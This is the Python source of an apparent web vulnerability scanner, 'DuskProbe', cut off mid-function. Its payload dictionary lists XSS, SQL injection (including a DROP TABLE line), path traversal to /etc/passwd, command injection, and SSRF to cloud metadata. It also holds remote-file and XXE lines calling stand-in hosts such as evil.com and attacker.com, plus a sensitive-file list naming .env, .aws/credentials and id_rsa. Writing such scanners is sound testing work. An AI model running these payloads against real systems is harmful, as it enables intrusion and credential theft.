#!/usr/bin/env python3
"""
DuskProbe v5.0 - Advanced Asynchronous Web Vulnerability Scanner
Streamlit Web Application
Author: Labib Bin Shahed

Usage:
    streamlit run duskprobe.py
"""

import os
import re
import json
import socket
import logging
import sys
import asyncio
import aiohttp
import streamlit as st
import pandas as pd
import numpy as np
from io import StringIO, BytesIO
from logging.handlers import RotatingFileHandler
from pathlib import Path
from datetime import datetime, timedelta
from typing import List, Dict, Set, Tuple
from urllib.parse import urlparse, urljoin, quote
from collections import Counter, defaultdict
import hashlib
import base64

# Rich console for beautiful output
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, BarColumn, TimeRemainingColumn, SpinnerColumn, TextColumn
from rich.panel import Panel
from rich.logging import RichHandler
import yaml

# Termgraph for terminal-based graphs and charts
try:
    import termgraph.termgraph as tg
    from termgraph import termgraph
    TERMGRAPH_AVAILABLE = True
except ImportError:
    TERMGRAPH_AVAILABLE = False

# --- Global Flags & Constants ---

# Check for optional dependencies and set flags
try:
    import pandas as pd
    PD_AVAILABLE = True
except ImportError:
    PD_AVAILABLE = False

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False

try:
    from stem import Signal
    from stem.control import Controller
    TOR_AVAILABLE = True
except ImportError:
    TOR_AVAILABLE = False

try:
    from fake_useragent import UserAgent
    UA_AVAILABLE = True
except ImportError:
    UA_AVAILABLE = False

# Enhanced reconnaissance and vulnerability scanning libraries
try:
    import shodan
    SHODAN_AVAILABLE = True
except ImportError:
    SHODAN_AVAILABLE = False

try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

try:
    import builtwith
    BUILTWITH_AVAILABLE = True
except ImportError:
    BUILTWITH_AVAILABLE = False

try:
    import waybackpy
    WAYBACK_AVAILABLE = True
except ImportError:
    WAYBACK_AVAILABLE = False

try:
    import dns.resolver
    import dns.query
    import dns.zone
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

try:
    import scapy.all as scapy
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    import sslyze
    from sslyze import Scanner, ServerScanRequest, ServerNetworkLocation
    from sslyze.plugins.scan_commands import ScanCommand
    SSLYZE_AVAILABLE = True
except ImportError:
    SSLYZE_AVAILABLE = False

try:
    import httpx
    HTTPX_AVAILABLE = True
except ImportError:
    HTTPX_AVAILABLE = False

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

# Advanced Security Libraries for Enhanced Reconnaissance
try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

try:
    import nmap
    NMAP_AVAILABLE = True
except ImportError:
    NMAP_AVAILABLE = False

try:
    from Crypto.Cipher import AES
    from Crypto.Hash import MD5, SHA256
    PYCRYPTO_AVAILABLE = True
except ImportError:
    PYCRYPTO_AVAILABLE = False

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.common.by import By
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

try:
    import lxml
    from lxml import html, etree
    LXML_AVAILABLE = True
except ImportError:
    LXML_AVAILABLE = False

try:
    import censys.search
    CENSYS_AVAILABLE = True
except ImportError:
    CENSYS_AVAILABLE = False

try:
    import vulners
    VULNERS_AVAILABLE = True
except ImportError:
    VULNERS_AVAILABLE = False

try:
    import sublist3r
    SUBLIST3R_AVAILABLE = True
except ImportError:
    SUBLIST3R_AVAILABLE = False

try:
    import dirb
    DIRB_AVAILABLE = True
except ImportError:
    DIRB_AVAILABLE = False

try:
    import subprocess
    import concurrent.futures
    ADVANCED_TOOLS_AVAILABLE = True
except ImportError:
    ADVANCED_TOOLS_AVAILABLE = False

try:
    import magic
    FILEMAGIC_AVAILABLE = True
except ImportError:
    FILEMAGIC_AVAILABLE = False

try:
    import jwt
    import base64
    JWT_AVAILABLE = True
except ImportError:
    JWT_AVAILABLE = False

# Advanced Website Structure Mapping Libraries
try:
    import requests_html
    REQUESTS_HTML_AVAILABLE = True
except ImportError:
    REQUESTS_HTML_AVAILABLE = False

try:
    import urllib.robotparser
    import urllib.parse as urlparse_advanced
    ROBOTPARSER_AVAILABLE = True
except ImportError:
    ROBOTPARSER_AVAILABLE = False

try:
    from collections import deque
    import threading
    import time
    THREADING_AVAILABLE = True
except ImportError:
    THREADING_AVAILABLE = False

try:
    import hashlib
    import mimetypes
    CONTENT_ANALYSIS_AVAILABLE = True
except ImportError:
    CONTENT_ANALYSIS_AVAILABLE = False

# Advanced Reconnaissance Libraries (FREE & MODERN)
try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

try:
    import dns.resolver
    import dns.reversename
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

try:
    import builtwith
    BUILTWITH_AVAILABLE = True
except ImportError:
    BUILTWITH_AVAILABLE = False

try:
    from ipwhois import IPWhois
    IPWHOIS_AVAILABLE = True
except ImportError:
    IPWHOIS_AVAILABLE = False

try:
    import tldextract
    TLDEXTRACT_AVAILABLE = True
except ImportError:
    TLDEXTRACT_AVAILABLE = False

try:
    import ssl
    import OpenSSL
    from cryptography import x509
    from cryptography.hazmat.backends import default_backend
    SSL_ANALYSIS_AVAILABLE = True
except ImportError:
    SSL_ANALYSIS_AVAILABLE = False

# Modern HTTP & Network Analysis
try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False

try:
    import socket
    import struct
    SOCKET_AVAILABLE = True
except ImportError:
    SOCKET_AVAILABLE = False

# Fingerprinting & Hashing
try:
    import hashlib
    import base64
    HASH_AVAILABLE = True
except ImportError:
    HASH_AVAILABLE = False

# Certificate Transparency & Historical Data
try:
    from urllib.parse import quote as url_quote
    import json
    CT_AVAILABLE = True
except ImportError:
    SSL_ANALYSIS_AVAILABLE = False

try:
    from netaddr import IPAddress, IPNetwork
    NETADDR_AVAILABLE = True
except ImportError:
    NETADDR_AVAILABLE = False

DEFAULT_USER_AGENT = "DuskProbe/5.0"
LOG_FORMAT = '%(asctime)s - %(levelname)s - %(message)s'
REQUEST_TIMEOUT = 3          # Reduced for speed
CONCURRENCY_LIMIT = 100     # Increased for maximum performance  
CONFIG_FILE = 'config.yaml'

# Rich console for beautiful output
console = Console()


# --- Configuration Class ---

class DuskProbeConfig:
    """Configuration management for DuskProbe."""
    
    def __init__(self, args):
        self.args = args
        self.console = console
        
        # Load config file first to allow overrides from command line
        if self.args.config and Path(self.args.config).exists():
            self._load_config_file(self.args.config)

        self.reports_dir = Path(self.args.output_dir) if self.args.output_dir else Path.cwd() / "reports"
        self.logs_dir = Path(self.args.log_dir) if self.args.log_dir else Path.cwd() / "logs"
        
        # Create directories
        self.reports_dir.mkdir(parents=True, exist_ok=True)
        self.logs_dir.mkdir(parents=True, exist_ok=True)
        
        # Setup logging
        self.logger = self._setup_logging()
    
    def _load_config_file(self, config_path):
        """Load settings from a YAML config file."""
        try:
            with open(config_path, 'r') as f:
                config_data = yaml.safe_load(f)
            
            if not config_data:
                return

            # Override args with config file settings only if they were not specified on the command line
            for key, value in config_data.items():
                if hasattr(self.args, key) and getattr(self.args, key) is None:
                    setattr(self.args, key, value)
            
            self.console.print(f"[bold green]✅ Loaded configuration from {config_path}[/bold green]")
        except FileNotFoundError:
            self.console.print(f"[bold red]❌ Config file not found: {config_path}[/bold red]")
        except Exception as e:
            self.console.print(f"[bold red]❌ Error loading config file: {e}[/bold red]")

    def _setup_logging(self):
        """Setup comprehensive logging."""
        logger = logging.getLogger("DuskProbe")
        
        # Set log level
        log_level = logging.INFO
        if self.args.quiet:
            log_level = logging.WARNING
        elif self.args.verbose:
            log_level = logging.DEBUG
        logger.setLevel(log_level)
        
        # Remove existing handlers
        if logger.hasHandlers():
            logger.handlers.clear()
        
        # File handler
        log_file = self.logs_dir / f"duskprobe_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        file_handler = RotatingFileHandler(log_file, maxBytes=5*1024*1024, backupCount=3)
        file_handler.setLevel(logging.DEBUG)
        file_formatter = logging.Formatter(LOG_FORMAT)
        file_handler.setFormatter(file_formatter)
        logger.addHandler(file_handler)
        
        # Console handler (using Rich)
        if not self.args.quiet:
            rich_handler = RichHandler(console=self.console, show_time=False, show_path=False, level=log_level, rich_tracebacks=True)
            logger.addHandler(rich_handler)
        
        self.log_file = log_file
        return logger


# --- Asynchronous Networking ---

class AsyncSession:
    """Optimized asynchronous session handler with aggressive performance settings."""

    def __init__(self, config: DuskProbeConfig):
        self.config = config
        # Dramatically increased concurrency for maximum speed
        self.semaphore = asyncio.Semaphore(100)  # Increased from 10 to 100
        self.response_cache = {}  # Cache to avoid duplicate requests
        
        headers = {
            'User-Agent': UserAgent().random if UA_AVAILABLE else DEFAULT_USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Accept-Encoding': 'gzip, deflate'  # Enable compression for speed
        }
        
        # Optimized connector settings for maximum performance
        connector = aiohttp.TCPConnector(
            limit=200,              # Increased connection pool
            limit_per_host=50,      # More connections per host
            ttl_dns_cache=300,      # DNS caching
            use_dns_cache=True,
            enable_cleanup_closed=True,
            keepalive_timeout=30,
            ssl=False               # Disable SSL verification for speed in testing
        )
        
        self.session = aiohttp.ClientSession(
            headers=headers,
            timeout=aiohttp.ClientTimeout(
                total=3,            # Reduced from 10 to 3 seconds
                connect=1,          # Fast connection timeout
                sock_read=2         # Socket read timeout
            ),
            connector=connector
        )

    async def __aenter__(self):
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.close()

    async def get(self, url: str, allow_redirects=True) -> Tuple[int, Dict, str, str]:
        """Optimized GET request with caching and early returns."""
        # Check cache first to avoid duplicate requests
        cache_key = f"GET:{url}"
        if cache_key in self.response_cache:
            return self.response_cache[cache_key]
            
        async with self.semaphore:
            try:
                async with self.session.get(url, allow_redirects=allow_redirects) as response:
                    # Fast content reading with size limit for performance
                    content = await response.text(errors='ignore')
                    if len(content) > 100000:  # Limit content size for speed
                        content = content[:100000]
                    
                    result = (response.status, dict(response.headers), content, str(response.url))
                    
                    # Cache successful responses to avoid duplicate requests
                    if response.status == 200 and len(self.response_cache) < 1000:
                        self.response_cache[cache_key] = result
                    
                    return result
                    
            except aiohttp.ClientError as e:
                self.config.logger.debug(f"Request error for {url}: {e}")
            except asyncio.TimeoutError:
                self.config.logger.debug(f"Request timed out for {url}")
            return None, {}, "", url

    async def post(self, url: str, data=None, headers=None, **kwargs) -> Tuple[int, Dict, str, str]:
        """Optimized POST request for vulnerability testing."""
        async with self.semaphore:
            try:
                post_headers = headers or {}
                async with self.session.post(url, data=data, headers=post_headers, 
                                           allow_redirects=True, **kwargs) as response:
                    content = await response.text(errors='ignore')
                    if len(content) > 100000:  # Limit content for speed
                        content = content[:100000]
                    return (response.status, dict(response.headers), content, str(response.url))
                    
            except aiohttp.ClientError as e:
                self.config.logger.debug(f"POST request error for {url}: {e}")
            except asyncio.TimeoutError:
                self.config.logger.debug(f"POST request timed out for {url}")
            return None, {}, "", url

    async def close(self):
        if not self.session.closed:
            await self.session.close()


# --- Security Checks ---

class SecurityChecker:
    """Advanced security checks with enterprise-grade vulnerability detection."""
    
    def __init__(self, session: AsyncSession, config: DuskProbeConfig):
        self.session = session
        self.config = config
        
        # Advanced payload sets for comprehensive testing
        self.payloads = {
            'xss': [
                "<script>alert('XSS')</script>",
                "\"><script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "';alert('XSS');//",
                "<iframe src=\"javascript:alert('XSS')\">",
                "<body onload=alert('XSS')>",
                "<details open ontoggle=alert('XSS')>",
                "<marquee onstart=alert('XSS')>",
                "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
                "<script>alert(/XSS/.source)</script>",
                "<img src=\"\" onerror=\"alert('XSS')\">",
                "<%2Fscript%3E%3Cscript%3Ealert('XSS')%3C%2Fscript%3E"
            ],
            'sqli': [
                "' OR 1=1--",
                "1' UNION SELECT null,null--",
                "admin'--",
                "' OR 'a'='a",
                "1' AND 1=1--",
                "1' OR 1=1#",
                "'; DROP TABLE users--",
                "1' UNION SELECT user(),version()--",
                "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "1' OR SLEEP(5)--",
                "1' AND 1=2 UNION SELECT 1,2,3--",
                "1'; WAITFOR DELAY '00:00:05'--",
                "1' UNION ALL SELECT NULL,concat(user(),0x3a,version()),NULL--",
                "1'||'1'='1",
                "1' AND ascii(substring((SELECT password FROM users LIMIT 1),1,1))>64--"
            ],
            'lfi': [
                "../../../../etc/passwd",
                "....//....//....//etc/passwd",
                "/etc/passwd%00",
                "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
                "....//....//....//....//etc//passwd",
                "php://filter/read=convert.base64-encode/resource=index.php",
                "php://input",
                "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
                "expect://whoami",
                "/proc/self/environ",
                "/proc/version",
                "/etc/hostname",
                "C:\\windows\\system32\\drivers\\etc\\hosts",
                "/var/log/apache2/access.log",
                "....//....//....//....//windows//system32//drivers//etc//hosts"
            ],
            'rfi': [
                "http://evil.com/shell.txt",
                "https://pastebin.com/raw/malicious",
                "ftp://attacker.com/shell.php",
                "//evil.com/shell.txt"
            ],
            'cmd_injection': [
                "| id",
                "; id",
                "&& id",
                "|| id",
                "` id `",
                "$(id)",
                "|whoami",
                ";cat /etc/passwd",
                "&&ls -la",
                "|ping -c 4 127.0.0.1",
                ";ping -n 4 127.0.0.1",
                "$(cat /etc/passwd)",
                "`cat /etc/passwd`",
                "| type C:\\windows\\system32\\drivers\\etc\\hosts"
            ],
            'ssrf': [
                "http://127.0.0.1:8080/",
                "http://localhost:22",
                "http://169.254.169.254/latest/meta-data/",
                "file:///etc/passwd",
                "http://[::1]:80/",
                "http://0.0.0.0:8080",
                "gopher://127.0.0.1:6379/",
                "dict://localhost:11211/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://169.254.169.254/metadata/v1/",
                "ldap://127.0.0.1:389/"
            ],
            'xxe': [
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;]>",
                "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///c:/windows/system32/drivers/etc/hosts\">]><data>&file;</data>"
            ],
            'template_injection': [
                "{{7*7}}",
                "${7*7}",
                "<%=7*7%>",
                "{{config}}",
                "{{config.items()}}",
                "${T(java.lang.Runtime).getRuntime().exec('id')}",
                "#{7*7}",
                "${{7*7}}",
                "{{''.__class__.__mro__[2].__subclasses__()}}"
            ],
            'nosql_injection': [
                "[$ne]=null",
                "[$regex]=.*",
                "[$gt]=",
                "[$where]=sleep(1000)",
                "'; return true; var dummy='",
                "' || 1==1//",
                "[$exists]=false"
            ],
            'ldap_injection': [
                "*",
                "*)(&",
                "*))%00",
                "admin)(&(objectClass=*",
                "*)|(objectClass=*"
            ],
            'xpath_injection': [
                "' or '1'='1",
                "' or 1=1 or ''='",
                "x' or name()='username' or 'x'='y",
                "'] | //user/*[contains(*,'admin')] | //comment()['"
            ],
            'sensitive_files': [
                ".git/config",
                ".env",
                ".htaccess",
                "web.config",
                "WEB-INF/web.xml",
                "META-INF/MANIFEST.MF",
                "config.php",
                "database.yml",
                "settings.py",
                ".aws/credentials",
                "id_rsa",
                "id_dsa",
                "known_hosts",
                "backup.sql",
                "dump.sql",
                "phpinfo.php",
                "test.php",
                "robots.txt",
                "sitemap.xml",
                ".DS_Store",
                "Thumbs.db",
                "desktop.ini",
                "crossdomain.xml",
                "clientaccesspolicy.xml",
                "swagger.json",
                "swagger.yaml",
                "api-docs"
            ],
            'open_redirect': [
                "//evil.com",
                "https://evil.com",
                "javascript:alert('XSS')",
                "/\\evil.com",
                "//google.com@evil.com",
                "https://google.com.evil.com",
                "\\\\evil.com"
            ],
            'crlf_injection': [
                "%0d%0aSet-Cookie:%20malicious=true",
                "%0d%0aContent-Length:%200%0d%0a%0d%0a",
                "\r\nSet-Cookie: injected=true",
                "%0d%0aLocation:%20http://evil.com"
            ],
            # ═══════════════════════════════════════════════════════════════════════
            # 🔥 NEW ADVANCED VULNERABILITY PAYLOADS
            # ═══════════════════════════════════════════════════════════════════════
            'jwt': [
                'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.',
                'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.signature'
            ],
            'graphql_injection': [
                "query{__schema{types{name}}}",
                "query{__type(name:\"User\"){fields{name}}}",
                "{users(id:\"1' OR '1'='1\"){email}}",
                "query IntrospectionQuery{__schema{queryType{name}mutationType{name}types{...FullType}}}fragment FullType on __Type{kind name fields{name args{...InputValue}type{...TypeRef}}interfaces{...TypeRef}}fragment InputValue on __InputValue{name type{...TypeRef}}fragment TypeRef on __Type{kind name ofType{kind name}}",
                "mutation{__typename}",
                "{__typename users{id email}}"
            ],
            'csv_injection': [
                "=cmd|'/c calc'!A1",
                "=1+1",
                "=SUM(1+1)",
                "@SUM(1+1)",
                "+1+1",
                "-1+1",
                "=1+1+cmd|'/c calc'!A1",
                "=HYPERLINK(\"http://evil.com\",\"click\")",
                "=IMPORTXML(\"http://evil.com/xxe.xml\",\"//\")"
            ],
            'deserialization': [
                'O:8:"stdClass":0:{}',  # PHP object
                'rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldA==',  # Java serialized (base64)
                '__reduce__',  # Python pickle indicator
                'a:1:{i:0;s:4:"test";}',  # PHP serialized array
                '{"@type":"java.lang.Runtime"}',  # Java JSON deserialization
                'AC ED 00 05',  # Java serialization magic bytes
            ],
            'http_smuggling': [
                'Transfer-Encoding: chunked\r\nTransfer-Encoding: identity',
                'Content-Length: 13\r\nTransfer-Encoding: chunked',
            ]
        }
        
        # Enhanced pattern matching
        self.error_patterns = {
            'sql': re.compile(r'(sql|mysql|oracle|postgresql|mssql|sqlite|syntax error|unclosed quotation|quoted string|unexpected end|column .* doesn\'t exist)', re.I),
            'php': re.compile(r'(php warning|php error|fatal error|parse error|undefined function|call to undefined)', re.I),
            'asp': re.compile(r'(microsoft ole db|odbc|jet database|asp\.net)', re.I),
            'java': re.compile(r'(java\.lang\.|java\.sql\.|javax\.|spring framework|struts)', re.I),
            'python': re.compile(r'(traceback|python|django|flask)', re.I),
            'generic': re.compile(r'(error|exception|warning|stack trace|debug)', re.I)
        }
        
        self.file_indicators = re.compile(r'(root:|daemon:|bin/bash|java.sun.com|windows|system32|users:|administrators:)', re.I)
        self.aws_metadata = re.compile(r'(ami-id|instance-id|security-groups|iam)', re.I)
        self.gcp_metadata = re.compile(r'(compute|instance|metadata)', re.I)

    async def _analyze_server_hosting(self, url: str, headers: Dict, content: str) -> Dict:
        """Advanced server and hosting infrastructure analysis with geolocation."""
        info = {}
        
        try:
            # Extract domain and resolve IP
            parsed = urlparse(url)
            domain = parsed.netloc
            
            # IP Resolution
            try:
                ip_address = socket.gethostbyname(domain)
                info['ip_address'] = ip_address
                info['hostname'] = domain
            except:
                info['ip_address'] = 'Unknown'
                info['hostname'] = domain
            
            # Geolocation Detection (using IP-based heuristics)
            if 'ip_address' in info and info['ip_address'] != 'Unknown':
                ip = info['ip_address']
                # Extract country/region from various sources
                country_hints = []
                
                # Check server headers for location hints
                server_header = headers.get('server', '').lower()
                cf_ray = headers.get('cf-ray', '')
                if cf_ray:
                    country_hints.append('Cloudflare Protected')
                
                # Check for CDN indicators
                cdn_headers = {
                    'x-amz-cf-id': 'AWS CloudFront',
                    'x-akamai-transformed': 'Akamai CDN',
                    'x-cdn': 'CDN',
                    'x-cache': 'Cached',
                    'cf-cache-status': 'Cloudflare',
                    'x-served-by': 'Fastly/Varnish'
                }
                
                for header, cdn_name in cdn_headers.items():
                    if header in headers:
                        country_hints.append(f'{cdn_name}: {headers[header][:50]}')
                
                info['geolocation_hints'] = country_hints if country_hints else ['Direct Server']
                
                # IP range analysis for hosting provider
                ip_parts = ip.split('.')
                if ip_parts[0] in ['54', '52', '18', '35', '34']:
                    info['hosting_provider'] = 'Amazon Web Services (AWS)'
                elif ip_parts[0] in ['104', '35', '34']:
                    info['hosting_provider'] = 'Google Cloud Platform (GCP)'
                elif ip_parts[0] in ['13', '20', '40', '51', '52']:
                    info['hosting_provider'] = 'Microsoft Azure'
                elif ip_parts[0] in ['104', '172']:
                    info['hosting_provider'] = 'Cloudflare'
                else:
                    info['hosting_provider'] = 'Unknown/Private Hosting'
            
            # Server identification
            server = headers.get('server', headers.get('Server', 'Unknown'))
            info['server_software'] = server
            
            # Detailed server version extraction
            if 'nginx' in server.lower():
                info['server_type'] = 'Nginx'
                version_match = re.search(r'nginx/([0-9.]+)', server, re.I)
                info['server_version'] = version_match.group(1) if version_match else 'Unknown'
            elif 'apache' in server.lower():
                info['server_type'] = 'Apache'
                version_match = re.search(r'apache/([0-9.]+)', server, re.I)
                info['server_version'] = version_match.group(1) if version_match else 'Unknown'
            elif 'microsoft-iis' in server.lower() or 'iis' in server.lower():
                info['server_type'] = 'Microsoft IIS'
                version_match = re.search(r'iis/([0-9.]+)', server, re.I)
                info['server_version'] = version_match.group(1) if version_match else 'Unknown'
            elif 'litespeed' in server.lower():
                info['server_type'] = 'LiteSpeed'
            elif 'cloudflare' in server.lower():
                info['server_type'] = 'Cloudflare'
            else:
                info['server_type'] = server if server != 'Unknown' else 'Not Disclosed'
                info['server_version'] = 'Unknown'
            
            # Powered-by headers
            powered_by = headers.get('x-powered-by', headers.get('X-Powered-By', ''))
            if powered_by:
                info['powered_by'] = powered_by
                
                # Extract technology versions
                if 'php' in powered_by.lower():
                    php_match = re.search(r'php/([0-9.]+)', powered_by, re.I)
                    info['php_version'] = php_match.group(1) if php_match else 'Unknown'
                elif 'asp.net' in powered_by.lower():
                    info['framework'] = 'ASP.NET'
                    
            # Server timing headers
            if 'server-timing' in headers:
                info['server_timing'] = headers['server-timing']
            
            # Platform detection
            platform_headers = {
                'x-aspnet-version': 'ASP.NET',
                'x-aspnetmvc-version': 'ASP.NET MVC',
                'x-powered-cms': 'CMS Platform'
            }
            
            for header, platform in platform_headers.items():
                if header in headers:
                    info['platform'] = f"{platform} {headers[header]}"
                    
        except Exception as e:
            self.config.logger.debug(f"Server analysis error: {e}")
        
        return info
    
    async def _analyze_backend_stack(self, headers: Dict, content: str, url: str) -> Dict:
        """Comprehensive backend technology stack fingerprinting."""
        info = {}
        
        try:
            # Programming Language Detection
            language_indicators = {
                'PHP': [
                    'x-powered-by.*php',
                    'phpsessid',
                    '.php',
                    'set-cookie.*php'
                ],
                'Python': [
                    'x-powered-by.*python',
                    'django',
                    'flask',
                    'wsgi',
                    'uvicorn',
                    'gunicorn'
                ],
                'Node.js': [
                    'x-powered-by.*express',
                    'x-powered-by.*node',
                    'connect.sid'
                ],
                'Ruby': [
                    'x-powered-by.*ruby',
                    'x-powered-by.*rails',
                    'rack'
                ],
                'Java': [
                    'x-powered-by.*servlet',
                    'jsessionid',
                    'x-powered-by.*jsp',
                    'x-powered-by.*tomcat'
                ],
                'ASP.NET': [
                    'x-aspnet-version',
                    'x-aspnetmvc-version',
                    'asp.net_sessionid'
                ],
                'Go': [
                    'x-powered-by.*go'
                ]
            }
            
            detected_languages = []
            for lang, patterns in language_indicators.items():
                for pattern in patterns:
                    # Check headers
                    for header, value in headers.items():
                        if re.search(pattern, f"{header} {value}", re.I):
                            detected_languages.append(lang)
                            break
                    # Check content
                    if re.search(pattern, content[:5000], re.I):
                        if lang not in detected_languages:
                            detected_languages.append(lang)
            
            info['server_language'] = detected_languages if detected_languages else ['Not Detected']
            
            # Framework Detection
            frameworks = {
                'Django': r'(django|__debug__|csrftoken)',
                'Flask': r'(flask|werkzeug)',
                'Express': r'(express|x-powered-by.*express)',
                'Rails': r'(rails|ruby on rails)',
                'Laravel': r'(laravel|laravel_session)',
                'Spring': r'(spring|jsessionid)',
                'ASP.NET MVC': r'(aspnetmvc|mvc)',
                'FastAPI': r'(fastapi|uvicorn)',
                'Symfony': r'(symfony)',
                'CodeIgniter': r'(codeigniter|ci_session)',
                'CakePHP': r'(cakephp)',
                'Struts': r'(struts)',
                'Next.js': r'(next\.js|__next)',
                'Nuxt.js': r'(nuxt|__nuxt)',
                'Meteor': r'(meteor)',
            }
            
            detected_frameworks = []
            for framework, pattern in frameworks.items():
                if re.search(pattern, content[:10000], re.I):
                    detected_frameworks.append(framework)
                for header, value in headers.items():
                    if re.search(pattern, f"{header} {value}", re.I):
                        if framework not in detected_frameworks:
                            detected_frameworks.append(framework)
            
            info['framework'] = detected_frameworks if detected_frameworks else ['Not Detected']
            
            # Database Detection (via headers and error messages)
            database_indicators = {
                'MySQL': r'(mysql|mariadb)',
                'PostgreSQL': r'(postgresql|postgres|psql)',
                'MongoDB': r'(mongodb|mongo)',
                'Redis': r'(redis)',
                'SQLite': r'(sqlite)',
                'Oracle': r'(oracle|ora-)',
                'SQL Server': r'(sql server|mssql)',
                'Cassandra': r'(cassandra)',
                'DynamoDB': r'(dynamodb)',
            }
            
            detected_databases = []
            for db, pattern in database_indicators.items():
                if re.search(pattern, content[:10000], re.I):
                    detected_databases.append(db)
            
            if detected_databases:
                info['database_hints'] = detected_databases
                
        except Exception as e:
            self.config.logger.debug(f"Backend analysis error: {e}")
        
        return info
    
    async def _analyze_frontend_stack(self, content: str, headers: Dict) -> Dict:
        """Advanced frontend technology and library detection."""
        info = {}
        
        try:
            # JavaScript Framework Detection
            js_frameworks = {
                'React': [r'react', r'_react', r'reactDOM', r'__REACT'],
                'Vue.js': [r'vue\.js', r'__vue__', r'v-if', r'v-for'],
                'Angular': [r'angular', r'ng-app', r'ng-controller', r'@angular'],
                'Svelte': [r'svelte', r'__svelte'],
                'Ember': [r'ember', r'ember\.js'],
                'Backbone': [r'backbone', r'backbone\.js'],
                'jQuery': [r'jquery', r'\$\(', r'jquery\.min\.js'],
                'Alpine.js': [r'alpine', r'x-data'],
                'Preact': [r'preact'],
            }
            
            detected_js_frameworks = []
            for framework, patterns in js_frameworks.items():
                for pattern in patterns:
                    if re.search(pattern, content[:20000], re.I):
                        detected_js_frameworks.append(framework)
                        break
            
            info['javascript_framework'] = detected_js_frameworks if detected_js_frameworks else ['Not Detected']
            
            # CSS Framework Detection
            css_frameworks = {
                'Bootstrap': r'(bootstrap|bs-)',
                'Tailwind CSS': r'(tailwind)',
                'Material-UI': r'(material-ui|mui)',
                'Bulma': r'(bulma)',
                'Foundation': r'(foundation)',
                'Semantic UI': r'(semantic-ui)',
                'Ant Design': r'(antd)',
            }
            
            detected_css = []
            for framework, pattern in css_frameworks.items():
                if re.search(pattern, content[:15000], re.I):
                    detected_css.append(framework)
            
            if detected_css:
                info['css_framework'] = detected_css
            
            # Build Tool / Bundler Detection
            build_tools = {
                'Webpack': r'webpack',
                'Vite': r'vite',
                'Parcel': r'parcel',
                'Rollup': r'rollup',
                'Gulp': r'gulp',
                'Grunt': r'grunt',
            }
            
            detected_build_tools = []
            for tool, pattern in build_tools.items():
                if re.search(pattern, content[:10000], re.I):
                    detected_build_tools.append(tool)
            
            if detected_build_tools:
                info['build_tool'] = detected_build_tools
                
            # CMS Detection
            cms_indicators = {
                'WordPress': [r'wp-content', r'wp-includes', r'wordpress'],
                'Drupal': [r'drupal', r'/sites/default', r'drupal\.js'],
                'Joomla': [r'joomla', r'/components/com_'],
                'Magento': [r'magento', r'mage/cookies'],
                'Shopify': [r'shopify', r'cdn\.shopify'],
                'Wix': [r'wix\.com', r'parastorage'],
                'Squarespace': [r'squarespace'],
                'Ghost': [r'ghost', r'ghost\.org'],
                'Medium': [r'medium\.com'],
                'Contentful': [r'contentful'],
                'Strapi': [r'strapi'],
            }
            
            detected_cms = []
            for cms, patterns in cms_indicators.items():
                for pattern in patterns:
                    if re.search(pattern, content[:15000], re.I):
                        detected_cms.append(cms)
                        break
            
            if detected_cms:
                info['cms'] = detected_cms
                
        except Exception as e:
            self.config.logger.debug(f"Frontend analysis error: {e}")
        
        return info
    
    async def _analyze_network_protocol(self, url: str, headers: Dict) -> Dict:
        """Network and protocol-level analysis."""
        info = {}
        
        try:
            parsed = urlparse(url)
            
            # Protocol Analysis
            info['protocol'] = parsed.scheme.upper()
            
            # HTTP Version Detection
            http_version_headers = ['http2', 'http/2', 'h2', 'spdy']
            for header, value in headers.items():
                for version_hint in http_version_headers:
                    if version_hint in str(value).lower() or version_hint in header.lower():
                        info['http_version'] = 'HTTP/2'
                        break
            
            if 'http_version' not in info:
                info['http_version'] = 'HTTP/1.1' if parsed.scheme == 'https' else 'HTTP/1.0'
            
            # SSL/TLS Information
            if parsed.scheme == 'https':
                info['tls_enabled'] = True
                
                # Extract SSL/TLS hints from headers
                strict_transport = headers.get('strict-transport-security', '')
                if strict_transport:
                    info['hsts_enabled'] = True
                    info['hsts_max_age'] = strict_transport
                else:
                    info['hsts_enabled'] = False
                
